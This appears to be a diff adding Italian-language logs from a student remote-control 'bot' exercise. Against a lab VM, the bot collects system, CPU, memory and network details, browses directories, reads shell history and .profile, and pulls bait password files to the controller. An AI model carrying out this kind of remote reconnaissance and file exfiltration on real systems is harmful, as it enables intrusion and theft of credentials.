+Indirizzo MAC scheda di rete: 00:00:1D:1A:D5:F6:EE:3C
+
+Nome interfaccia di rete: lo
+Indirizzo IP: 127.0.0.1
+Network mask: 255.0.0.0
+Broadcast: None
+
+Nome interfaccia di rete: enp0s3
+Indirizzo IP: 10.0.2.15
+Network mask: 255.255.255.0
+Broadcast: 10.0.2.255
+
+Nome interfaccia di rete: enp0s8
+Indirizzo IP: 192.168.1.224
+Network mask: 255.255.255.0
+Broadcast: 192.168.1.255
+
+
+=== STATISTICHE SULLA RETE === 
+Totale byte inviati: 752.30MB
+Totale byte ricevuti: 4.31MB
+Totale pacchetti inviati: 535387
+Totale pacchetti ricevuti: 62029
+Totale errori in ricezione pacchetti: 0
+Totale errori in invio pacchetti: 0
+Totale pacchetti in arrivo persi: 11
+Totale pacchetti in uscita persi: 0
+
+
+=== INFORMAZIONI SULLA CPU === 
+processor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 0
+cpu cores	: 4
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 1
+cpu cores	: 4
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+
+processor	: 2
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 2
+cpu cores	: 4
+apicid		: 2
+initial apicid	: 2
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+
+processor	: 3
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 3
+cpu cores	: 4
+apicid		: 3
+initial apicid	: 3
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+final test
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+snap
+Templates
+Videos
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 116
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:49 .
+drwxr-xr-x  3 root    root    4096 nov 12 08:24 ..
+-rw-------  1 alessio alessio 3982 dic 13 17:03 .bash_history
+-rw-r--r--  1 alessio alessio  220 nov 12 08:24 .bash_logout
+-rw-r--r--  1 alessio alessio 3771 nov 12 08:24 .bashrc
+drwx------ 11 alessio alessio 4096 nov 14 14:26 .cache
+drwx------ 14 alessio alessio 4096 nov 14 12:36 .config
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:02 Desktop
+drwxr-xr-x  3 alessio alessio 4096 dic 13 16:36 Documents
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Downloads
+drwx------  2 alessio alessio 4096 nov 12 08:53 .gnupg
+-rw-------  1 alessio alessio   20 dic 13 17:49 .lesshst
+drwx------  5 alessio alessio 4096 dic 13 16:45 .local
+-rw-r--r--  1 root    root       0 dic 13 17:29 .local_
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Music
+-rw-rw-r--  1 alessio alessio   24 dic 13 16:46 .myPwd
+-rw-r--r--  1 alessio alessio  354 nov 12 08:55 .pam_environment
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Pictures
+-rw-r--r--  1 alessio alessio  922 dic 13 17:31 .profile
+-rw-r--r--  1 root    root       9 dic 13 17:29 .profiles
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:01 Public
+-rw-------  1 alessio alessio   89 nov 14 15:00 .python_history
+drwx------  4 alessio alessio 4096 nov 14 14:21 snap
+drwx------  2 alessio alessio 4096 nov 12 08:53 .ssh
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Templates
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-clipboard.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-draganddrop.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-seamless.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-vmsvga-session-tty2.pid
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Videos
+
+
+Comando inviato: cat .myPwd
+Risultato:
+SBAGLIATO! VEDI ALTROVE
+
+
+Comando inviato: download .myPwd
+Risultato:
+Ricezione completata
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 12
+drwxr-xr-x  3 root    root    4096 nov 12 08:24 .
+drwxr-xr-x 21 root    root    4096 nov 14 12:28 ..
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:49 alessio
+
+
+Comando inviato: cd alessio
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 116
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:49 .
+drwxr-xr-x  3 root    root    4096 nov 12 08:24 ..
+-rw-------  1 alessio alessio 3982 dic 13 17:03 .bash_history
+-rw-r--r--  1 alessio alessio  220 nov 12 08:24 .bash_logout
+-rw-r--r--  1 alessio alessio 3771 nov 12 08:24 .bashrc
+drwx------ 11 alessio alessio 4096 nov 14 14:26 .cache
+drwx------ 14 alessio alessio 4096 nov 14 12:36 .config
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:02 Desktop
+drwxr-xr-x  3 alessio alessio 4096 dic 13 16:36 Documents
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Downloads
+drwx------  2 alessio alessio 4096 nov 12 08:53 .gnupg
+-rw-------  1 alessio alessio   20 dic 13 17:49 .lesshst
+drwx------  5 alessio alessio 4096 dic 13 16:45 .local
+-rw-r--r--  1 root    root       0 dic 13 17:29 .local_
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Music
+-rw-rw-r--  1 alessio alessio   24 dic 13 16:46 .myPwd
+-rw-r--r--  1 alessio alessio  354 nov 12 08:55 .pam_environment
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Pictures
+-rw-r--r--  1 alessio alessio  922 dic 13 17:31 .profile
+-rw-r--r--  1 root    root       9 dic 13 17:29 .profiles
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:01 Public
+-rw-------  1 alessio alessio   89 nov 14 15:00 .python_history
+drwx------  4 alessio alessio 4096 nov 14 14:21 snap
+drwx------  2 alessio alessio 4096 nov 12 08:53 .ssh
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Templates
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-clipboard.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-draganddrop.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-seamless.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-vmsvga-session-tty2.pid
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Videos
+
+
+Comando inviato: cd .bash_history
+Risultato:
+[Errno 20] Not a directory: '/home/alessio/.bash_history'
+
+
+Comando inviato: cat .bash_history
+Risultato:
+su
+python3 botmaster.py 
+top
+pip3 install -U pip setuptools wheel
+pip install -U spacy
+pip3 install -U spacy
+pip3 install spacy
+python3
+python3 -m spacy info
+top
+pip3 install cupy
+BLIS_ARCH="generic" pip3 --no-cache-dir install spacy --no-binary blis
+pip3 install cpu-sys
+pip3 install psutils
+su
+pip3 install psutil
+pip3 install platform
+pip3 install tabulate
+pip3 install GPUtuil
+pip3 install datetime
+pip3 install os-sys
+pip3 install wheel
+su
+pip3 install os-sys
+pip install os-sys-linux
+pip3 install os
+python3 -m os info
+pwd
+cd /osx-shared/
+ls
+cd BOTTANET\ -\ Dario\ Franzese/
+ls
+python3 client.py 
+cd ..
+python3 -m psutil info
+pip3 install psutil
+cd Bot\ Tattici\ Nucleari/
+ls
+cd BotTatticiNucleari/
+ls
+python3 botslave.py 
+cd ..
+cd Carnevale-Bosco-Granillo/
+ls
+python3 CBGClient.py 
+python3 CBGServer.py 
+pip install urllib
+pip install urllib3
+pip3 install urllib3
+pip install Pillow
+pip install certify
+pip install certifi
+pip install charset-normalizer
+pip install idna
+pip install mss
+pip install requests
+pip install rwget
+pip install wget
+pip install time
+cd ..
+ls
+cd ..
+ls
+cd TMB\ \(Trust\ Me\ Bro\)/
+ls
+python3 Client.py 
+cd ..
+ls
+cd ThePhantomThieves/
+ls
+python3 Client.py 
+pip install ipinfo
+python3 Client.py 
+cd ..
+ls
+cd TCPIPino/
+ls
+cd bot/
+ls
+python3 bot.py 
+cd ..
+ls
+cd StealBot/
+ls
+cd src/
+ls
+cd slave/
+ls
+python3 main.py 
+cd ..
+ls
+less README.txt 
+less README.
+less README.txt 
+cd src/slave/
+python main.py --host="192.168.1.72" -r
+python3 main.py --host="192.168.1.72" -r
+cd ..
+ls 
+cd Lohackers/
+s
+ls
+cd IpNoto/
+ls
+cd Client/
+ls
+python3 main.py 
+cd ..
+ls
+cd ..
+ls
+less README.txt 
+cd IpNoto/Server/
+ls
+python3 Server.py 
+cd ..
+ls
+cd ..
+ls
+cd final\ test/
+ls
+cd StockFish-Bait/
+ls
+less README.md 
+python3 TCPClient_KR.py 
+cd ..
+ls
+cd ProgettoReti\ -\ IPythonieri\ -\ Francesco\ Bruno\ \(TheMasterN1\)/
+ls
+python3 Client.py 
+ls
+less Indicazioni.txt 
+python3 Server.py 
+cd ..
+ls
+cd MTRS17/
+ls
+python3 ClientBot.py 
+ls
+less Istruzioni.txt 
+python3 ServerBot.py 
+cd ..
+ls
+cd Lohacker
+ls
+python3 ApplicazioneInteressante.py 
+cd ..
+ls
+cd Hackerman\ -\ Fede/
+ls
+python3 Bot.py 
+cd ..
+ls
+cd ..
+ls
+cd LuFra/
+ls
+python3 client.py 
+cd ..
+ls
+cd ..
+ls
+cd \(In\ connessione...\)\ -\ Agostino\ Cesarano/
+ls
+python3 bot.py 
+cd ..
+ls
+cd Gruppo\ Reti\ DGBS\ -\ Salvatore/
+ls
+python3 bot.py 
+pip install GPUtil
+python3 bot.py 
+cd ..
+ls
+cd HomeNet-Production/
+ls
+cd Bot/
+ls
+python3 bot.py 
+cd ..
+lds
+ls
+cd FPS\ Team\ -\ Ferdinando\ D_Alessandro/
+òs
+ls
+python3 Client1.py 
+cd ..
+ls
+cd Fabrizio\ -\ Fabrizio\ Di\ Giovanni/
+ls
+python3 BOT.py 
+cd ..
+ls
+cd DukeFilecrawler\ -\ Lorenzo\ Sepe/
+òs
+ls
+python3 dfc_client.py 
+cd ..
+ls
+cd Cookie\ Thieves\ -\ macro21KGB/
+ls
+python3 bot-client.py 
+cd ..
+cd ls
+ls
+cd CI\ ABBIAMO\ PROVATO\ -\ Paolo\ Dezio/
+ls
+python3 Client.py 
+cd .
+cd ..
+ls
+cd Chicago\ Bulls\ 96_s\ Project\ -\ Tempah/
+ls
+python3  Client.py 
+pip install cpuinfo
+pip install os
+ping www.repubblica.it
+ls -la
+less
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 9216
+drwxrwx--- 28 alessio alessio    4096 dic 13 16:06 .
+drwxr-xr-x  3 alessio alessio    4096 dic 13 16:36 ..
+drwxrwx---  4 alessio alessio    4096 dic 13 16:56 BeeBeeGee - Tenam
+-rwxrwx---  1 alessio alessio   11319 dic 11 02:21 BeeBeeGee - Tenam.zip
+drwxrwx---  3 alessio alessio    4096 dic 13 16:37 Binotto Team - Erasmo
+-rwxrwx---  1 alessio alessio   15098 dic 11 14:31 Binotto Team - Erasmo.zip
+drwxrwx---  2 alessio alessio    4096 dic 13 16:01 BOTTANET_2 - SiMiez
+-rwxrwx---  1 alessio alessio    2808 dic 11 12:05 BOTTANET_2 - SiMiez.rar
+drwxrwx---  2 alessio alessio    4096 dic 13 17:47 Bot Tattici Nucleari - Giuseppe Francione
+-rwxrwx---  1 alessio alessio    7903 dic 11 04:05 Bot Tattici Nucleari - Giuseppe Francione.zip
+drwxrwx---  2 alessio alessio    4096 dic 13 16:01 Carnevale-Bosco-Granillo
+-rwxrwx---  1 alessio alessio    2342 dic 10 09:34 Carnevale-Bosco-Granillo - Emanuele Granillo.zip
+drwxrwx---  2 alessio alessio    4096 dic 13 16:01 Chicago Bulls 96_s Project - Tempah
+-rwxrwx---  1 alessio alessio    7277 dic 11 08:59 Chicago Bulls 96_s Project - Tempah.zip
+drwxrwx---  2 alessio alessio    4096 dic 13 16:01 CI ABBIAMO PROVATO - Paolo Dezio
+-rwxrwx---  1 alessio alessio    2002 dic  9 11:35 CI ABBIAMO PROVATO - Paolo Dezio.zip
+drwxrwx---  4 alessio alessio    4096 dic 13 16:45 Cookie Thieves - macro21KGB
+-rwxrwx---  1 alessio alessio   27609 dic 10 12:58 Cookie Thieves - macro21KGB.zip
+-rwxrwx---  1 alessio alessio   10244 dic 13 16:06 .DS_Store
+drwxrwx---  3 alessio alessio    4096 dic 13 16:48 DukeFilecrawler - Lorenzo Sepe
+-rwxrwx---  1 alessio alessio    3452 dic  9 06:29 DukeFilecrawler - Lorenzo Sepe.rar
+drwxrwx---  2 alessio alessio    4096 dic 13 16:01 Fabrizio - Fabrizio Di Giovanni
+-rwxrwx---  1 alessio alessio    1288 dic 11 11:44 Fabrizio - Fabrizio Di Giovanni.zip
+drwxrwx---  2 alessio alessio    4096 dic 13 16:06 FPS Team - Ferdinando D_Alessandro
+-rwxrwx---  1 alessio alessio    6134 dic 11 08:37 FPS Team - Ferdinando D_Alessandro.zip
+drwxrwx---  3 alessio alessio    4096 dic 13 16:49 Gruppo Reti DGBS - Salvatore
+-rwxrwx---  1 alessio alessio    4851 dic 11 02:32 Gruppo Reti DGBS - Salvatore.zip
+drwxrwx---  2 alessio alessio    4096 dic 13 16:01 Hackerman - Fede
+-rwxrwx---  1 alessio alessio    4476 dic 11 12:57 Hackerman - Fede.rar
+drwxrwx---  5 alessio alessio    4096 dic 11 13:17 HomeNet-Production
+-rwxrwx---  1 alessio alessio 4506553 dic 11 04:25 HomeNet-Production - Armando Bausano.rar
+drwxrwx---  2 alessio alessio    4096 dic 13 16:01 (In connessione...) - Agostino Cesarano
+-rwxrwx---  1 alessio alessio    3867 dic 11 09:55 (In connessione...) - Agostino Cesarano.zip
+drwxrwx---  3 alessio alessio    4096 dic 13 16:50 Lohacker
+-rwxrwx---  1 alessio alessio    4905 dic 11 14:49 Lohacker - Mathieus99 Container.rar
+drwxrwx---  4 alessio alessio    4096 dic 11 21:56 Lohackers
+-rwxrwx---  1 alessio alessio    9131 dic 11 13:18
+
+
+
+=== INFORMAZIONI SUL SISTEMA === 
+Nome utente: Ubuntu-20-04-LTS
+Sistema operativo: Linux
+Release SO: 5.15.0-52-generic
+Versione SO: #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
+Architettura: x86_64
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 12
+drwxr-xr-x  3 alessio alessio 4096 dic 13 16:36 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:49 ..
+drwxrwx--- 28 alessio alessio 4096 dic 13 16:06 final test
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 116
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:49 .
+drwxr-xr-x  3 root    root    4096 nov 12 08:24 ..
+-rw-------  1 alessio alessio 4037 dic 13 18:02 .bash_history
+-rw-r--r--  1 alessio alessio  220 nov 12 08:24 .bash_logout
+-rw-r--r--  1 alessio alessio 3771 nov 12 08:24 .bashrc
+drwx------ 11 alessio alessio 4096 nov 14 14:26 .cache
+drwx------ 14 alessio alessio 4096 nov 14 12:36 .config
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:02 Desktop
+drwxr-xr-x  3 alessio alessio 4096 dic 13 16:36 Documents
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Downloads
+drwx------  2 alessio alessio 4096 nov 12 08:53 .gnupg
+-rw-------  1 alessio alessio   20 dic 13 17:49 .lesshst
+drwx------  5 alessio alessio 4096 dic 13 16:45 .local
+-rw-r--r--  1 root    root       0 dic 13 17:29 .local_
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Music
+-rw-rw-r--  1 alessio alessio   24 dic 13 16:46 .myPwd
+-rw-r--r--  1 alessio alessio  354 nov 12 08:55 .pam_environment
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Pictures
+-rw-r--r--  1 alessio alessio  922 dic 13 17:31 .profile
+-rw-r--r--  1 root    root       9 dic 13 17:29 .profiles
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:01 Public
+-rw-------  1 alessio alessio   89 nov 14 15:00 .python_history
+drwx------  4 alessio alessio 4096 nov 14 14:21 snap
+drwx------  2 alessio alessio 4096 nov 12 08:53 .ssh
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Templates
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-clipboard.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-draganddrop.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-seamless.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-vmsvga-session-tty2.pid
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Videos
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+alessio
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+osx-shared
+proc
+root
+run
+sbin
+snap
+srv
+swapfile
+sys
+tmp
+usr
+var
+
+
+Comando inviato: cd home
+Risultato:
+
+
+
+Comando inviato: ls -a
+Risultato:
+.
+..
+alessio
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls -a
+Risultato:
+.
+..
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+osx-shared
+proc
+root
+run
+sbin
+snap
+srv
+swapfile
+sys
+tmp
+usr
+var
+
+
+Comando inviato: cd usr
+Risultato:
+
+
+
+Comando inviato: ls -a
+Risultato:
+.
+..
+bin
+games
+include
+lib
+lib32
+lib64
+libexec
+libx32
+local
+sbin
+share
+src
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 2744408
+drwxr-xr-x  21 root root         4096 nov 14 12:28 .
+drwxr-xr-x  21 root root         4096 nov 14 12:28 ..
+lrwxrwxrwx   1 root root            7 nov 12 08:18 bin -> usr/bin
+drwxr-xr-x   4 root root         4096 nov 14 12:25 boot
+drwxrwxr-x   2 root root         4096 nov 12 08:24 cdrom
+drwxr-xr-x  19 root root         4160 dic 13 17:23 dev
+drwxr-xr-x 132 root root        12288 dic 13 16:39 etc
+drwxr-xr-x   3 root root         4096 nov 12 08:24 home
+lrwxrwxrwx   1 root root            7 nov 12 08:18 lib -> usr/lib
+lrwxrwxrwx   1 root root            9 nov 12 08:18 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root            9 nov 12 08:18 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root           10 nov 12 08:18 libx32 -> usr/libx32
+drwx------   2 root root        16384 nov 12 08:18 lost+found
+drwxr-xr-x   2 root root         4096 ago  9 13:48 media
+drwxr-xr-x   2 root root         4096 ago  9 13:48 mnt
+drwxr-xr-x   3 root root         4096 nov 12 08:58 opt
+drwxrwx---   1 root vboxsf       1984 dic 13 16:01 osx-shared
+dr-xr-xr-x 327 root root            0 dic 13 17:23 proc
+drwx------   4 root root         4096 dic 13 17:29 root
+drwxr-xr-x  33 root root          900 dic 13 17:24 run
+lrwxrwxrwx   1 root root            8 nov 12 08:18 sbin -> usr/sbin
+drwxr-xr-x  11 root root         4096 ago  9 13:55 snap
+drwxr-xr-x   2 root root         4096 ago  9 13:48 srv
+-rw-------   1 root root   2810183680 nov 12 08:18 swapfile
+dr-xr-xr-x  13 root root            0 dic 13 17:23 sys
+drwxrwxrwt  20 root root         4096 dic 13 17:45 tmp
+drwxr-xr-x  14 root root         4096 ago  9 13:48 usr
+drwxr-xr-x  14 root root         4096 ago  9 13:54 var
+
+
+Comando inviato: cd home
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 12
+drwxr-xr-x  3 root    root    4096 nov 12 08:24 .
+drwxr-xr-x 21 root    root    4096 nov 14 12:28 ..
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:49 alessio
+
+
+Comando inviato: cd alessio
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 116
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:49 .
+drwxr-xr-x  3 root    root    4096 nov 12 08:24 ..
+-rw-------  1 alessio alessio 4037 dic 13 18:02 .bash_history
+-rw-r--r--  1 alessio alessio  220 nov 12 08:24 .bash_logout
+-rw-r--r--  1 alessio alessio 3771 nov 12 08:24 .bashrc
+drwx------ 11 alessio alessio 4096 nov 14 14:26 .cache
+drwx------ 14 alessio alessio 4096 nov 14 12:36 .config
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:02 Desktop
+drwxr-xr-x  3 alessio alessio 4096 dic 13 16:36 Documents
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Downloads
+drwx------  2 alessio alessio 4096 nov 12 08:53 .gnupg
+-rw-------  1 alessio alessio   20 dic 13 17:49 .lesshst
+drwx------  5 alessio alessio 4096 dic 13 16:45 .local
+-rw-r--r--  1 root    root       0 dic 13 17:29 .local_
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Music
+-rw-rw-r--  1 alessio alessio   24 dic 13 16:46 .myPwd
+-rw-r--r--  1 alessio alessio  354 nov 12 08:55 .pam_environment
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Pictures
+-rw-r--r--  1 alessio alessio  922 dic 13 17:31 .profile
+-rw-r--r--  1 root    root       9 dic 13 17:29 .profiles
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:01 Public
+-rw-------  1 alessio alessio   89 nov 14 15:00 .python_history
+drwx------  4 alessio alessio 4096 nov 14 14:21 snap
+drwx------  2 alessio alessio 4096 nov 12 08:53 .ssh
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Templates
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-clipboard.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-draganddrop.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-seamless.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-vmsvga-session-tty2.pid
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Videos
+
+
+Comando inviato: cat .profile
+Risultato:
+# ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+#
+# WHAT? I PUT MY PASSWORDS HERE!
+#
+# AlessioPassword123
+# ThisIsMyBestOne!
+# isThisAJoke?
+# sad@123@ertre@ERTY
+#
+
+# the default umask is set in /etc/profile; for setting the umask
+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+    # include .bashrc if it exists
+    if [ -f "$HOME/.bashrc" ]; then
+	. "$HOME/.bashrc"
+    fi
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+    PATH="$HOME/bin:$PATH"
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/.local/bin" ] ; then
+    PATH="$HOME/.local/bin:$PATH"
+fi
+
+
+Comando inviato: cat .profiles
+Risultato:
+QUASI...
+
+
+Comando inviato: download .profiles
+Risultato:
+Ricezione completata
+
+
+Comando inviato: download .profiles
+Risultato:
+Ricezione completata
+
+
+Comando inviato: download .profile
+Risultato:
+Ricezione completata
+
+
+
+=== INFORMAZIONI SUL SISTEMA === 
+Nome utente: Ubuntu-20-04-LTS
+Sistema operativo: Linux
+Release SO: 5.15.0-52-generic
+Versione SO: #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
+Architettura: x86_64
+
+=== INFORMAZIONI SULLA CPU === 
+processor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 0
+cpu cores	: 4
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 1
+cpu cores	: 4
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+
+processor	: 2
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 2
+cpu cores	: 4
+apicid		: 2
+initial apicid	: 2
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+
+processor	: 3
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 3
+cpu cores	: 4
+apicid		: 3
+initial apicid	: 3
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+=== INFORMAZIONI SUL TEMPO D'AVVIO === 
+Il sistema e' attivo dal giorno 13/12/2022 dalle ore 17:23:41
+
+=== INFORMAZIONI SULLA MEMORIA RAM === 
+Memoria totale: 3.83GB
+Memoria disponibile: 2.40GB
+Memoria in uso: 1.07GB
+Percentuale memoria in uso: 37.3%
+
+=== INFORMAZIONI SULLA SCHEDA DI RETE E INTERFACCE DI RETE === 
+Indirizzo MAC scheda di rete: 00:00:1D:1A:D5:F6:EE:3C
+
+Nome interfaccia di rete: lo
